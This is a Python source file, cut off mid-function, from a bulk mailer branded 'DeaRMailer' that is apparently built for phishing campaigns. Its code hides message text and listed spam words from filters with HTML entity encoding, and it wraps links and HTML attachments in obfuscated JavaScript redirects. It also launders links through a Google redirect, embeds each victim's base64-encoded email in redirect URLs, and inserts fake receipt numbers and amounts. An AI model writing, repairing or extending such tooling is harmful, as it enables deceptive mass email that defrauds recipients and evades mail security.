#!/usr/bin/env python -W ignore::DeprecationWarning
# [LINKTOKENS-v4.5]
# [LINKSVG-v4.4]
# [SVGFIX4-v4.4]
# [SVGFIX3-v4.4]
import warnings
import shutil
import json
warnings.filterwarnings("ignore", category=DeprecationWarning) 
try:
    import requests
    import urllib.request
    from datetime import timedelta, date,datetime
    import sys 
    import colorama
    from colorama import Fore, Back, Style
    from email.mime.text import MIMEText
    from email.header import Header
    from email.mime.base import MIMEBase
    from email import encoders
    from base64 import encodebytes
    from os.path import basename
    import smtplib
    import queue
    import threading
    import os,codecs,string,re,time,ssl,textwrap
    from email.mime.multipart import MIMEMultipart
    import random,string,base64
    from random import randrange, uniform
    from random import *
    import random
    from email.mime.image import MIMEImage
    from configparser import ConfigParser
    import configparser
    from email.utils import formataddr
    from dns import resolver
    from platform import system as system_name
    import uuid
    from urllib.parse import urlparse
    from pdf_mail import sendpdf
    import urllib.parse
    import dns
    import socket
    import ipaddress
    import subprocess
    from tld import get_tld
    from io import BytesIO
    from pathlib import Path
except ImportError as e:
    #e = e[0][16:]
    print(f"Please install {e.args[0].rsplit(' ',1)[-1]} :importation failed...")
    exit(1)

# v9.5: 'qrcode' is optional - a missing module must never abort the whole app
# at import time (it previously did). It is guarded and skipped when absent.
try:
    import qrcode
except ImportError:
    qrcode = None
    print("[WARN] Python module 'qrcode' is not installed; QR-code generation will be "
          "skipped. Install it with: pip install \"qrcode[pil]\"")

# Ensure placeholder replacement utilities are available from functions.py
import functions as _functions
from functions import replace_placeholders, render_signature_html, random_signature
import hashlib
import re as _re

current_smtp_frommail = ''


def _resolve_attachment_name(recipient, name, default):
    """Resolve {PLACEHOLDER} tokens in an attachment filename and reduce it to a safe basename.

    Previously the pdf/doc/docx/rtf/pptx/ics/svg attachment configs passed their raw
    'name' straight into Content-Disposition, so literal tokens such as
    {BLOCKDOMAINNAME} leaked into the delivered filename (and into the on-disk
    generated file). PDF already used replace_placeholders(); this applies the same
    behaviour to every remaining attachment type.
    """
    raw = str(name or '').strip() or default
    try:
        resolved = replace_placeholders(recipient or '', raw, skip_link=True)
    except Exception:
        resolved = raw
    resolved = os.path.basename(str(resolved).strip()) or default
    resolved = resolved.replace('/', '_').replace('\\', '_')
    return resolved or default

# v9.2: runtime globals wired from sender_config so previously-ignored
# settings actually take effect.
configured_timezone = 'UTC'      # sender_config.timezone  -> {DATE|TIME} macros
inline_images_enabled = 0        # sender_config.inline_images -> base64 img handling


def _current_zip_key():
    """Zip password for {ZIPKEY} when zip password protection is enabled."""
    try:
        if zip_setup.get('password_protection', 0) == 1:
            return str(zip_setup.get('password') or '')
    except NameError:
        pass
    return ''


def _current_pdf_key():
    """PDF password for {PDFKEY} when pdf password protection is enabled."""
    try:
        if pdf_setup.get('password_protection', 0) == 1:
            return str(pdf_setup.get('password') or '')
    except NameError:
        pass
    return ''


def replace_placeholders(email, text, skip_link=False, info=None, timezone=None):
    global current_smtp_frommail
    # v9.2: honour sender_config.timezone for {DATE|TIME}/{TIME} macros. Callers
    # that pass an explicit timezone still win; otherwise use the configured one.
    if not timezone or str(timezone).strip().lower() in ('', 'none', 'default'):
        timezone = configured_timezone or 'UTC'
    _functions.CURRENT_SMTP_FROMMAIL = str(current_smtp_frommail or '').strip()
    _functions.set_current_smtp_frommail(current_smtp_frommail)
    _functions.set_current_zip_key(_current_zip_key())
    _functions.set_current_pdf_key(_current_pdf_key())
    return _functions.replace_placeholders(email, text, skip_link=skip_link, info=info, timezone=timezone)


def build_date_header(timezone=None):
    """v9.2: RFC 5322 compliant Date header.

    Every message MUST carry a Date header; many providers/spam filters
    penalise or outright reject mail that omits it. Use the configured
    sender_config timezone (same source as the {DATE|TIME} macros) when it
    resolves, otherwise fall back to the host's local UTC offset.
    """
    tz = timezone or configured_timezone or 'UTC'
    from datetime import datetime
    try:
        from email.utils import format_datetime
    except Exception:
        format_datetime = None
    try:
        if format_datetime is not None:
            try:
                from zoneinfo import ZoneInfo
                now = datetime.now(ZoneInfo(str(tz).strip() or 'UTC'))
            except Exception:
                now = datetime.now().astimezone()
            return format_datetime(now)
    except Exception:
        pass
    try:
        from email.utils import formatdate
        return formatdate(localtime=True)
    except Exception:
        return None


custom_headers = {}
custom_header_sets = []
custom_headers_multiple = False
custom_headers_enabled = False
_pdf_finalize_lock = threading.Lock()


def load_custom_header_sets(path):
    """Load blank-line-separated custom header sets from a text file."""
    if not path or not os.path.isfile(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8') as header_file:
            content = header_file.read()
    except Exception:
        return []

    header_sets = []
    for block in re.split(r'\n\s*\n', content):
        headers = {}
        for line in block.splitlines():
            line = line.strip()
            if not line or line.startswith(('#', ';')):
                continue
            # v9.4: split on whichever delimiter appears first. Checking '='
            # before ':' mis-parsed values that contain '=' (e.g.
            # 'X-Token: abc=def' became key 'X-Token: abc').
            eq_index = line.find('=')
            colon_index = line.find(':')
            if colon_index != -1 and (eq_index == -1 or colon_index < eq_index):
                key, value = line.split(':', 1)
            elif eq_index != -1:
                key, value = line.split('=', 1)
            else:
                continue
            key = key.strip().rstrip(':').strip()
            if key.strip() and value.strip():
                headers[key] = value.strip()
        enabled = str(headers.get('enabled', '1')).strip().lower()
        if enabled in ('0', 'false', 'no', 'off'):
            continue
        if validate_custom_headers(headers):
            header_sets.append(headers)
    return header_sets


def get_custom_header_profile():
    if not custom_headers_enabled:
        return {}
    if custom_headers_multiple and custom_header_sets:
        return random.choice(custom_header_sets).copy()
    return custom_headers.copy()


def get_profile_value(profile, key):
    return profile.get(key) or profile.get(key.lower())


def get_profile_subject(profile):
    subjects = [
        value for key, value in profile.items()
        if re.fullmatch(r'subject\s*\d+', str(key).strip().lower()) and str(value).strip()
    ]
    return random.choice(subjects) if subjects else None


def validate_custom_headers(header_map):
    """Reject invalid sender identity config before the app sends mail."""
    if not header_map:
        return False
    has_message_id = False
    for key, value in header_map.items():
        if value is None:
            continue
        name = str(key).strip().lower()
        if name in ('enabled', 'create_placeholder_if_missing'):
            continue
        text = str(value).strip()
        if not text:
            continue
        # v9.4: a set that only supplies message-id-domain is valid because
        # apply_custom_headers() generates the Message-ID from it. Previously
        # such sets were silently dropped at load time.
        if name in ('message-id', 'messageid', 'message-id-domain', 'message_id_domain'):
            has_message_id = True
    return has_message_id


def apply_custom_headers(msg, recipient_email=None, extra=None, header_profile=None):
    """Apply configured custom MIME headers to the message."""
    if not custom_headers_enabled:
        return msg
    merged = {}
    try:
        merged.update(header_profile if header_profile is not None else get_custom_header_profile())
    except Exception:
        merged = {}
    if extra:
        for key, value in extra.items():
            if value is not None and str(value).strip():
                merged[key] = value

    if not merged:
        return msg

    canonical = {}
    for key, value in merged.items():
        if value is None:
            continue
        control_key = str(key).strip().lower()
        if control_key in ('enabled', 'create_placeholder_if_missing', 'fromname', 'fromemail') or re.fullmatch(r'subject\s*\d+', control_key):
            continue
        # v9.5: never let a custom header overwrite envelope/parse-critical headers
        # (that caused spoofed To/From/Subject and HeaderParseError crashes).
        if control_key in ('to', 'cc', 'bcc', 'from', 'sender', 'date',
                           'subject', 'content-type', 'mime-version'):
            continue
        text = str(value).strip()
        # v9.5: strip CR/LF so a header value can never inject extra headers or
        # raise email.errors.HeaderParseError when the message is serialized.
        text = re.sub(r'[\r\n]+', ' ', text).strip()
        if not text:
            continue
        try:
            if recipient_email:
                text = findString(recipient_email, text)
        except Exception:
            pass
        norm = re.sub(r'[^a-z0-9]+', '-', str(key).lower()).strip('-')
        if norm in ('message-id', 'messageid', 'message-id', 'message-id-'):
            canonical['message-id'] = text
        elif norm in ('return-path', 'returnpath', 'return-path', 'return_path'):
            canonical['return-path'] = text
        elif norm in ('message-id-domain', 'message_id_domain'):
            canonical['message-id-domain'] = text
        else:
            canonical[norm or str(key).strip()] = text

    if canonical.get('message-id-domain') and not canonical.get('message-id'):
        domain = str(canonical.get('message-id-domain')).strip()
        if domain.startswith('<') and domain.endswith('>'):
            domain = domain[1:-1].strip()
        # Guarantee a valid addr-spec: never emit '<hexexample.com>'.
        if not domain.startswith('@'):
            domain = '@' + domain.lstrip('@')
        canonical['message-id'] = f'<{uuid.uuid4().hex}{domain}>'

    for key, value in canonical.items():
        header_name = re.sub(r'[\r\n:]+', '', str(key).strip())
        if header_name in ('message-id-domain', 'message_id_domain'):
            # Control value only; the Message-ID header was derived above.
            continue
        if header_name == 'message-id':
            msg['Message-ID'] = value
        elif header_name == 'return-path':
            msg['Return-Path'] = value
        else:
            msg[header_name] = value
    return msg


def _safe_basename_from_url(u):
    p = urllib.parse.urlparse(u).path
    b = os.path.basename(p)
    if not b:
        h = hashlib.md5(u.encode('utf-8')).hexdigest()[:8]
        return f"image_{h}.png"
    b = _re.sub(r'[^A-Za-z0-9._-]', '_', b)
    h = hashlib.md5(u.encode('utf-8')).hexdigest()[:8]
    name, ext = os.path.splitext(b)
    if not ext:
        ext = '.png'
    return f"{name}_{h}{ext}"


def download_image_to_logopics(url):
    # v9.4: create the folder atomically (race-safe) and never leave a 0-byte
    # stub behind. Previously a failed download wrote an empty file and handed
    # it back as a valid logo, producing emails with a broken/blank image.
    subPath = 'LOGO_PICS'
    try:
        os.makedirs(subPath, exist_ok=True)
    except OSError:
        pass
    filename = _safe_basename_from_url(url)
    dest = os.path.join(subPath, filename)
    if os.path.exists(dest) and os.path.getsize(dest) > 0:
        return dest
    try:
        urllib.request.urlretrieve(url, dest)
    except Exception as exc:
        try:
            print(f"{Fore.YELLOW}[IMAGE] Could not download {url}: {exc}{Style.RESET_ALL}")
        except Exception:
            pass
        try:
            if os.path.exists(dest):
                os.remove(dest)
        except OSError:
            pass
        return None
    if not os.path.isfile(dest) or os.path.getsize(dest) == 0:
        try:
            if os.path.exists(dest):
                os.remove(dest)
        except OSError:
            pass
        return None
    return dest

if system_name().lower()=="windows":
  colorama.init(autoreset=True)
  def prRed(): return Fore.RED
  def prGreen(): return Fore.GREEN
  def prYellow(): return Fore.YELLOW
  def prBlack(): return Fore.BLACK

  def BRed(): return Back.RED
  def BGreen(): return Back.GREEN
  def BYellow(): return Back.YELLOW
  def BBlack(): return Fore.BLACK


  def prPurple(prt): print(prt)
  def prCyan(prt): print(prt)
  def prLightGray(prt): print(prt)
  def prBlack(prt): print(prt) 
else:
  def prRed(prt): return("\033[91m{}\033[00m" .format(prt))
  def prGreen(prt): return("\033[92m{}\033[00m" .format(prt))
  def prYellow(prt): return("\033[93m{}\033[00m" .format(prt))
  def prLightPurple(prt): return("\033[94m{}\033[00m" .format(prt))
  def prPurple(prt): return("\033[95m{}\033[00m" .format(prt))
  def prCyan(prt): return("\033[96m{}\033[00m" .format(prt))
  def prLightGray(prt): return("\033[97m{}\033[00m" .format(prt))
  def prBlack(prt): return("\033[98m{}\033[00m" .format(prt))

if system_name().lower()=="windows":
    os.system("title"+" DeaRMailer V.6.0.0.6 [ 0147GanG ]")

def bin2hex(binn):
    # v9.5: bytes.encode('hex') is Python 2 only; use bytes.hex().
    if isinstance(binn, (bytes, bytearray)):
        return binn.hex()
    return str(binn).encode('utf-8').hex()

def hex2bin(h):
  return codecs.decode(h,"hex")

def get_hardware_uuid():
        try:
            def get_hardware_serial():
                return io_key("IOPlatformSerialNumber")

            def get_board_id():
                return io_key("board-id").bytes().tobytes().decode("utf-8").rstrip("\x00")

            def io_key(keyname):
                return IORegistryEntryCreateCFProperty(IOServiceGetMatchingService(0, IOServiceMatching("IOPlatformExpertDevice".encode("utf-8"))), NSString.stringWithString_(keyname), None, 0)

            if system_name().lower()=="darwin":
                    import objc
                    from Foundation import NSBundle, NSString
                    IOKit_bundle = NSBundle.bundleWithIdentifier_('com.apple.framework.IOKit')

                    functions = [("IOServiceGetMatchingService", b"II@"),
                                 ("IOServiceMatching", b"@*"),
                                 ("IORegistryEntryCreateCFProperty", b"@I@@I"),
                                ]

                    objc.loadBundleFunctions(IOKit_bundle, globals(), functions)
                    return io_key("IOPlatformUUID")
            elif system_name().lower()=="windows":
                    return get_windows_uuid()
            else:
                    return str(GetNainIP())
        except Exception as e:
            print(e)

def GetNainIP():
    from requests import get
    ip = get('https://api.ipify.org').text
    return str(ip)

def get_windows_uuid():
    try:
        ip = str(uuid.uuid1())
        ip = "".join(ip.split('-', 2)[-1])
        n_ip,ip = ip.split('-', 1)
        ip = ip.split('-', 1)[-1]
        ip = ip+n_ip
        return ip
    except:
        pass 

    return str(GetNainIP())

def windowerror(window, message, *args):
    """Minimal error reporter used by the legacy checkkeycode(key, window)
    variant. The name was referenced but never defined, leaving a latent
    NameError on the token-error path; this stub makes the message visible
    without aborting the caller."""
    try:
        print(f"[KEY ERROR] {message}")
    except Exception:
        pass


def checkkeycode(key,window):
    try:
        if key == "":
            windowerror(window,"Token Cant be empty")
            return False
        key_file = "0DM"+key+".key"
        found = True if os.path.exists(key_file) else False
        if found:
            with open(key_file) as my_file:
                my_file.seek(0)
                first_char = my_file.read(1)
                if not first_char:
                    return False
                else:
                    my_file.seek(0)
                    content = my_file.read()
                    content = str(hex2bin(content),'utf-8')
                    new_key,ipplus = content.split('@', 1)
                    new_key = str(hex2bin(new_key),'utf-8')
                    ip,exptime = ipplus.split(':', 1)
                    ip = str(hex2bin(ip),'utf-8')
                    exptime = str(hex2bin(exptime),'utf-8')
                    new_ip = str(get_hardware_uuid())
                    is_key = True if ((new_key == key)) else False
                    is_ip = True if ((ip == get_hardware_uuid())) else False
                    if is_key:
                        if is_ip:
                            if its_date(exptime,window):
                                return True
                            else:
                                return False
                        else:
                            windowerror(window,key+ " Registered to another user.")
                            return False
                    else:
                        windowerror(window,key, "Invalid KEY :"+ key)
                        return False
        else:
            windowerror(window,"Invalid KEY : "+key)
            return False
    except Exception as e:
        windowerror(window, e)
        return False

def its_date(date):
    try:
        import datetime
        import dateutil.parser
        from datetime import datetime
        now = datetime.now()
        #current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        current_time = now.strftime("%Y-%m-%d")
        #print("Current Time =", current_time)
        insertion_date = dateutil.parser.parse(date)
        #print("Given Time =", str(insertion_date))
        if str(current_time) < str(insertion_date):
            #print "Date Still Valid"
            return True
        else:
            #print "Date Expired"
            return False
    except ImportError as e:
        e = ("Please install "+e.args[0].rsplit(' ',1)[-1])
        print(e)
    except Exception as e:
        print(e)
        return False

def DemonHtml(filename):
    contentdata = codecs.open(filename,'r','utf8').read()
    attdata = auto_code_html(contentdata)
    if os.path.isfile(filename):
        os.remove(filename)
    f = open(filename, "w+")
    f.write(attdata)
    f.close()
    return filename

def MakeHtml(email,filename,attch,link_url=None):
    try:
        contentdata = codecs.open(attch,'r','utf8').read()
        attdata = findString(email,contentdata, skip_link=link_url is not None)
        if link_url is not None:
            attdata = attdata.replace('{link}', link_url)
            attdata = attdata.replace('{LINK}', link_url)
            attdata = attdata.replace('{Link}', link_url)
            attdata = attdata.replace('[link]', link_url)
            attdata = attdata.replace('[LINK]', link_url)
            attdata = attdata.replace('[Link]', link_url)
        filename = findString(email,filename)
        directory = "ATT"
        if not os.path.exists(directory):
            os.makedirs(directory)
        tempfile  = "ATT/"+filename
        if os.path.isfile(tempfile):
            os.remove(tempfile)
        f = open(tempfile, "w+")
        f.write(attdata)
        f.close()
        return tempfile
    except Exception as e:
        print(str(e))

def MakeHtmlLink(email,filename,contentdata):
    try:
        #contentdata = codecs.open(attch,'r','utf8').read()
        attdata = findString(email,contentdata)
        filename = findString(email,filename)
        directory = "ATT"
        if not os.path.exists(directory):
            os.makedirs(directory)
        tempfile  = "ATT/"+filename
        if os.path.isfile(tempfile):
            os.remove(tempfile)
        f = open(tempfile, "w+")
        f.write(attdata)
        f.close()
        return tempfile
    except Exception as e:
        print(str(e))

def auto_code(link):
    tt = '<script language = "javascript" > document.write(unescape(\'<meta http-equiv="refresh" content="1;url='+link+'">\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\''+te+'\'))</script>'
    return nt

def auto_code_html(text):
    ts = ''.join(["\\u%04x" % (ord(c)) for c in text])
    tt = '<script language = "javascript" > document.write(unescape(\''+ts+'\')); </script>'
    te = ''.join(["\\u%04x" % (ord(c)) for c in tt])
    nt = '<script type="text/javascript">document.write(unescape(\''+te+'\'))</script>'
    return nt

def _encode_text_preserving_tokens(value, technique=1):
    if value is None:
        return value
    text = str(value)
    if not text:
        return text
    token_pattern = re.compile(r'\{[^{}]+\}|\[[^\[\]]+\]|<[^>]+>')

    def encode_literal(literal):
        encoded = f'&#{{}};' if technique == 1 else f'&#x{{:x}};'
        # v9.4: encode every character, including whitespace. Skipping
        # whitespace silently collapsed 'Hello World' to 'HelloWorld' once the
        # client decoded the entities (letters and subjects lost their spaces).
        return ''.join(encoded.format(ord(ch)) for ch in literal)

    parts = []
    last = 0
    for match in token_pattern.finditer(text):
        parts.append(encode_literal(text[last:match.start()]))
        parts.append(match.group(0))
        last = match.end()
    parts.append(encode_literal(text[last:]))
    return ''.join(parts)


def apply_letter_encryption(text, technique=None):
    if text is None:
        return text
    if not str(text).strip():
        return text
    if technique is None:
        technique = int(letter_setup.get('technique', 1) or 1)
        if int(letter_setup.get('enableEncryption', 0) or 0) != 1:
            return text
    elif technique in (0, False):
        return text
    return _encode_text_preserving_tokens(text, int(technique))


def apply_subject_encryption(subject, technique=None):
    if subject is None:
        return subject
    if not str(subject).strip():
        return subject
    if technique is None:
        technique = int(subject_setup.get('technique', 2) or 2)
        if int(subject_setup.get('enableEncryption', 0) or 0) != 1:
            return subject
    elif technique in (0, False):
        return subject
    return _encode_text_preserving_tokens(subject, int(technique))


def apply_word_encryption(text, words=None, technique=None):
    if text is None:
        return text
    if not str(text).strip():
        return text
    if technique is None:
        technique = int(spamWordEncryption.get('technique', 2) or 2)
        if not words and int(spamWordEncryption.get('enable', 0) or 0) != 1:
            return text
    elif technique in (0, False):
        return text
    if words is None:
        path = str(spamWordEncryption.get('spamList') or 'MULTIPLE/SpamList.txt').strip()
        words = []
        try:
            if os.path.isfile(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                    words = [line.strip() for line in fh if line.strip()]
        except Exception:
            words = []
    words = [word for word in (words or []) if isinstance(word, str) and word.strip()]
    if not words:
        return text
    transformed = text
    for word in sorted(set(words), key=len, reverse=True):
        pattern = re.compile(r'(?i)\b' + re.escape(word) + r'\b')
        transformed = pattern.sub(lambda m: _encode_text_preserving_tokens(m.group(0), int(technique)), transformed)
    return transformed


def findString(email,xstring, skip_link=False):
    # v9.4: parse the address defensively. Malformed leads (no '@', no dot in
    # the domain) previously raised IndexError and aborted the whole message.
    email = str(email or '')
    if '@' in email:
        username, _, domain = email.partition('@')
    else:
        username, domain = email, ''
    mename = username.capitalize()
    raw_domain_name = domain.split('.')[0] if domain else ''
    domain_suffixes = ('com','net','org','co','io','gov','edu','us','info','biz')
    if '-' in raw_domain_name and raw_domain_name.rsplit('-', 1)[-1].lower() in domain_suffixes:
        domain_name = raw_domain_name.rsplit('-', 1)[0].capitalize()
    else:
        domain_name = raw_domain_name.capitalize()
    domain_parts = domain.split('.') if domain else []
    domain_type = domain_parts[1] if len(domain_parts) > 1 else ''
    mename3 = mename[0:3] if mename else ''
    
    xstring = xstring.replace("{email}", email)
    xstring = xstring.replace("{year}", time.strftime("%Y"))
    xstring = xstring.replace("[year]", time.strftime("%Y"))
    xstring = xstring.replace("{equal}", "=")
    xstring = xstring.replace("{random}", Random())
    xstring = xstring.replace("[random]", Random(10))
    xstring = xstring.replace("{number}",RandomNumber())
    xstring = xstring.replace("[number]", RandomNumber(10))
    xstring = xstring.replace("{receipt}", RandomNumber(8))
    xstring = xstring.replace("{amount}", RandomAmount())
    xstring = xstring.replace("{hash}", RandomHash(20))
    xstring = xstring.replace("{mename}", mename)
    xstring = xstring.replace("{mename3}", mename3.upper())
    xstring = xstring.replace("{frmsite}", domain_name)
    # v9.5: get_tld() raises on malformed/edge-case domains and used to abort the
    # whole send run. Fall back to a plain domain extraction so {tld} never crashes.
    try:
        _tld_value = get_tld(email, fix_protocol=True)
    except Exception:
        _tld_value = str(email).rsplit('@', 1)[-1].strip() if '@' in str(email) else ''
    xstring = xstring.replace("{tld}", _tld_value)
    xstring = xstring.replace("[tld]", _tld_value)
    xstring = xstring.replace("[frmsite]", domain_name)
    xstring = xstring.replace("{domain}", domain)
    xstring = xstring.replace("{base64email}", base64encode(email))
    xstring = xstring.replace("[base64email]", base64encode(email))
    xstring = xstring.replace("{hexemail}", str2hex(email))
    xstring = xstring.replace("{time}", time.strftime("%H:%M:%S %p"))
    xstring = xstring.replace("[sec]", time.strftime("%S"))
    xstring = xstring.replace("{sec}", time.strftime("%S"))
    xstring = xstring.replace("{date}", time.strftime("%d %B, %Y"))
    xstring = xstring.replace("[Time_own_format]", time.strftime("%d %B, %Y") + time.strftime("%H:%M:%S %p"))

    # Compatibility aliases
    xstring = xstring.replace("{EMAIL64}", base64encode(email))
    xstring = xstring.replace("{Email64}", base64encode(email))
    xstring = re.sub(r"\$\{([^}]+)\}", r"{\1}", xstring)

    try:
        disclaimer = get_next_disclaimer()
        xstring = xstring.replace('{DISCLAIMER}', disclaimer).replace('{disclaimer}', disclaimer)
    except Exception:
        xstring = xstring.replace('{DISCLAIMER}', '').replace('{disclaimer}', '')

    if not skip_link and ('{link}' in xstring.lower() or '{LINK}' in xstring or '[link]' in xstring.lower()):
        current_link = get_next_link(email)
        xstring = xstring.replace('{link}', current_link)
        xstring = xstring.replace('{LINK}', current_link)
        xstring = xstring.replace('{Link}', current_link)
        xstring = xstring.replace('[link]', current_link)
        xstring = xstring.replace('[LINK]', current_link)
        xstring = xstring.replace('[Link]', current_link)
        # Expand any placeholders that may have been introduced by the inserted link
        try:
            xstring = xstring.replace('{base64email}', base64encode(email))
            xstring = xstring.replace('[base64email]', base64encode(email))
            xstring = xstring.replace('{EMAIL64}', base64encode(email))
            xstring = xstring.replace('{Email64}', base64encode(email))
            xstring = xstring.replace('{email}', email)
        except Exception:
            pass
    
    numregex = '{number(.*)}'
    pattern = r'{number(?:.|\n)*?}'

    textregex = '{random(.*)}'
    textpattern = r'{random(?:.|\n)*?}'

    cmdbaseregex = r'base64(\(.*?)\)'
    cmdbasepattern = r'base64\((?:.*?)\)'

    amountregex = '{amount(.*)}'
    amountpattern = r'{amount(?:.|\n)*?}'
    hashregex = '{hash(.*)}'
    hashpattern = r'{hash(?:.|\n)*?}'
    dateeregex = '{date(.*?)}'
    datepattern = r'{date(?:.|\n)*?}'
    receiptregex = '{receipt(.*)}'
    receiptpattern = r'{receipt(?:.|\n)*?}'

    numresult = re.findall(pattern, xstring, flags=re.DOTALL)

    textresult = re.findall(textpattern, xstring, flags=re.DOTALL)

    cmdbaseresult = re.findall(cmdbasepattern, xstring, flags=re.DOTALL)
    receiptresult = re.findall(receiptpattern, xstring, flags=re.DOTALL)
    amountresult = re.findall(amountpattern, xstring, flags=re.DOTALL)
    hashresult = re.findall(hashpattern, xstring, flags=re.DOTALL)

    for found in numresult:
        #print(found)
        nr = re.search(numregex, found).group(1)
        xstring = xstring.replace(str(found), RandomNumber(nr))

    for tfound in textresult:
        tr = re.search(textregex, tfound).group(1)
        xstring = xstring.replace(str(tfound), Random(tr))

    for cmdbfound in cmdbaseresult:
        #print(str(cmdbfound))
        cr = re.search(r'\((.*?)\)', cmdbfound).group(1)
        #print(cr)
        xstring = xstring.replace(str(cmdbfound), base64encode(cr))

    for rfound in receiptresult:
        rr = re.search(receiptregex, rfound).group(1)
        if rr and rr.strip():
            length = rr
        else:
            length = 8
        xstring = xstring.replace(str(rfound), RandomNumber(length))

    for afound in amountresult:
        ar = re.search(amountregex, afound).group(1)
        if ar and ar.strip():
            length = int(ar)
        else:
            length = None
        xstring = xstring.replace(str(afound), RandomAmount(length))

    for hfound in hashresult:
        hr = re.search(hashregex, hfound).group(1)
        if hr and hr.strip():
            length = int(hr)
        else:
            length = 20
        xstring = xstring.replace(str(hfound), RandomHash(length))

    for datefound in re.findall(datepattern, xstring, flags=re.DOTALL):
        dr = re.search(dateeregex, datefound).group(1)
        #date_1 = datetime.datetime.strptime(start_date, "%d %B, %Y")
        xstring = xstring.replace(str(datefound), (datetime.now() + timedelta(days=int(dr)) ).strftime('%d %B, %Y'))
    
    # Final pass through shared placeholder replacer to support newer placeholders
    try:
        xstring = replace_placeholders(email, xstring)
    except Exception:
        pass

    return str(xstring)

def Random(number=15):
    min_char = int(number)
    max_char = int(number)
    allchar = string.ascii_letters + string.digits
    rara = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return rara

def RandomNumber(number=15):
    min_char = int(number)
    max_char = int(number)
    allchar = string.digits
    rara = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return rara


def RandomAmount(number=None):
    # integer part: exactly `number` digits (no leading zeros); default is a 3-6 digit amount
    try:
        if number is None or str(number).strip() == '':
            digits = random.randint(3, 6)
        else:
            digits = int(number)
            if digits < 1:
                digits = 1
        int_part = random.randint(10 ** (digits - 1), 10 ** digits - 1)
    except Exception:
        int_part = random.randint(100, 999999)
    # cents
    try:
        cents = int(RandomNumber(2))
    except Exception:
        cents = random.randint(0, 99)
    return f"{int_part:,}.{cents:02d}"


def RandomHash(number=20):
    length = int(number)
    allchar = string.ascii_letters + string.digits
    return ''.join(choice(allchar) for _ in range(length))

def base64encode(data):
    if val_url(data):
        #print(data)
        encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
        encodedBytes = str(encodedBytes, "utf-8")
        #print(encodedBytes)
        return(encodedBytes)
    else:
        encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
        encodedStr = str(encodedBytes, "utf-8")
        return(encodedStr)

def base64encodeURL(data):
    encodedBytes = base64.urlsafe_b64encode(data.encode("utf-8"))
    encodedBytes = str(encodedBytes, "utf-8")
    return encodedBytes

def baseNewe(message):
    import base64
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

def val_url(url):
    regex = re.compile(
            r'^((http?|ftp)://|(www|ftp)\.)[a-z0-9-]+(\.[a-z0-9-]+)+([/?].*)?$', re.IGNORECASE)
    #p = re.compile('^(([^:/?#]+):)?(//([^/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?')
    #m = p.match(url)
    result = re.match(regex, url)
    if result:
        #print(result)
        return True

def Googlelink(link):
    link = urllib.parse.quote(link)
    link = "https://hangouts.google.com/linkredirect?dest="+link
    return link

def redirect403(email,domain403,url):
    u = urlparse(domain403)
    scheme = u.scheme
    domain = u.netloc
    onlyurl = scheme+'://'+str(Random(5))+'.'+domain+'/'+base64encode(email)+'#'+base64encode(url)
    return onlyurl

def str2hex(s):
    return s.encode("utf-8").hex()

def blowimgsrc(string):
    regex = r"""<ima?ge?(?=\s|>)(?=(?:[^>=]|='[^']*'|="[^"]*"|=[^'"][^\s>]*)*?\ssrc=(['"]?)(.*?)\1(?:\s|>))(?:[^>=]|='[^']*'|="[^"]*"|=[^'"][^\s>]*)*>""";

    intCount = 0
    imgs = []
    imgurl = []
    for matchObj in re.finditer( regex, string, re.M|re.I|re.S):
        imgsrc = os.path.basename(matchObj.group(2))
        


            #print("CID image ('%s')"%(imgsrc))
        imgs.append(imgsrc)
        imgurl.append(matchObj.group(2))
        #print " "
        #print "[", intCount, "][ 0 ] : ", matchObj.group(0)
        #print "[", intCount, "][ 1 ] : ", matchObj.group(1)
        #print "[", intCount, "][ 2 ] : ", matchObj.group(2)
        #print(os.path.basename(matchObj.group(2)))
        #print (os.path.split(matchObj.group(2))[-1])
        intCount+=1
    #ans = arr.array(imgs,imgurl)
    #return imgs
    return imgurl

def sort_leads(text,words,typec):
    text = text.lower()
    words = words.lower()

    def ignore(value):
        #global words
        #IGNList = selfconfig.get('OPTION', 'IGNList')
        lst = list(words.split(' '))
        for i in lst:
            if i in value:
                return False
        return True

    def include(value):
        #global words
        #IGNList = selfconfig.get('OPTION', 'IGNList')
        lst = list(words.split(' '))
        for i in lst:
            if i in value:
                return True
        return False

    rx = re.compile(r'\S+@\S+')
    if str(typec).lower() == "exclude":
        inputs = filter(ignore, rx.findall(text))
    elif str(typec).lower() == "include":
        inputs = filter(include, rx.findall(text))
    return inputs

def checkDomain( domain ):
    try:
        # Go with the first answer from the name server.
        # Future enhancement: determine which is primary MX
        # and go with that one.
        answers = dns.resolver.query(domain, 'MX')
        return str(answers[0]).split()[1] # python rocks right here.
    
    except:
        return False

def checkMXResolve( mx ):
    try:
        answers = dns.resolver.query(mx, 'A')
        return str(answers[0])

    except:
        return False

def is_valid_email(email):
    email = email.lower()
    regex = r"\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z"
    if(re.search(regex,email)):
        domain = email.rstrip().split('@')[1]
        mx = checkDomain(domain)
        if( False == mx ):
            return False
        else:
            return True

def check(email):
    regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
    if(re.search(regex,email.strip())):
        return True
        #print("Valid Email")   
    else:
        return False
        #print("Invalid Email")

# --- Link placeholder / rotation-list helpers ------------------------------
LINK_PLACEHOLDERS = frozenset(('{link}', '[link]', '${link}'))


def is_link_placeholder(value):
    return str(value or '').strip().lower() in LINK_PLACEHOLDERS


_last_link_warn_ts = 0.0


def _warn_missing_link(configured_link, link_list):
    # Warn at most once per 5 seconds; several send threads may hit this at once.
    global _last_link_warn_ts
    try:
        now = time.time()
        if now - _last_link_warn_ts < 5:
            return
        _last_link_warn_ts = now
